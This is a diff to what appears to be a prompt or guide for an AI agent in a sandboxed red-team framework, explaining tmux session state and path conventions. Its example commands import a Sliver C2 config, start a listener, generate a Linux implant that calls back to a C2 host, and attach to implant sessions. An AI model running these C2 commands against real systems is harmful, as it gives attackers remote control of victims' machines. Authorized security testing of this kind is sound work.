@@ -29,6 +29,24 @@ All commands execute inside the Docker sandbox via tmux sessions. You have NO ac
 | `background` | `False` | Set `True` for long-running commands. MUST use a dedicated session name |
 | `description` | `""` | Short activity label for UI display (e.g., "Scanning target ports") |
 
+### Working Directory & Session State
+
+Each tmux session is a long-lived shell. **Working directory, environment
+variables, and background jobs persist across calls** in the same session.
+
+- The session starts in `/workspace/` — that directory is the engagement
+  workspace.
+- After one `cd` (e.g. `cd recon`), every subsequent `bash(..., session="main")`
+  call is already there. Do NOT re-prefix every command with
+  `cd /workspace/... && ...` — it wastes tokens and signals confusion to the
+  reader. Just run `tail nmap_top1000.txt`, `ls`, etc.
+- If you genuinely lost track, run `pwd` once in the session and trust the
+  result. Do not re-`cd` defensively.
+- Different sessions (`session="scan-1"`, `session="scan-2"`) have INDEPENDENT
+  cwd state. A `cd` in `main` does not affect `scan-1`.
+- Prefer relative paths (`recon/nmap.txt`) once you are in `/workspace/` over
+  absolute (`/workspace/recon/nmap.txt`).
+
 ### Output Management
 
 The tool automatically manages output size to preserve context:
@@ -202,7 +220,7 @@ Do NOT fall back to background execution (`nohup`, `&`, resource files). Always 
 bash(command="sliver-client import /workspace/.sliver-configs/decepticon.cfg", session="c2")
 bash(command="sliver-client console", session="c2")
 bash(command="https -l 443 -d c2-sliver", is_input=True, session="c2")
-bash(command="generate --mtls c2-sliver:8888 --os linux --skip-symbols --save /workspace/<slug>/exploit/", is_input=True, session="c2", timeout=300)
+bash(command="generate --mtls c2-sliver:8888 --os linux --skip-symbols --save /workspace/exploit/", is_input=True, session="c2", timeout=300)
 bash(command="sessions", is_input=True, session="c2")
 bash(command="use <SESSION_ID>", is_input=True, session="c2")
 ```
@@ -216,7 +234,7 @@ As the orchestrator, you use bash ONLY for reading/writing state files — NOT f
 
 **Permitted uses:**
 ```
-bash(command="cat /workspace/<slug>/plan/opplan.json")
+bash(command="cat /workspace/plan/opplan.json")
 bash(command="ls /workspace/")
 bash(command="nc -z c2-sliver 31337 && echo 'C2_OK' || echo 'C2_DOWN'")
 ```
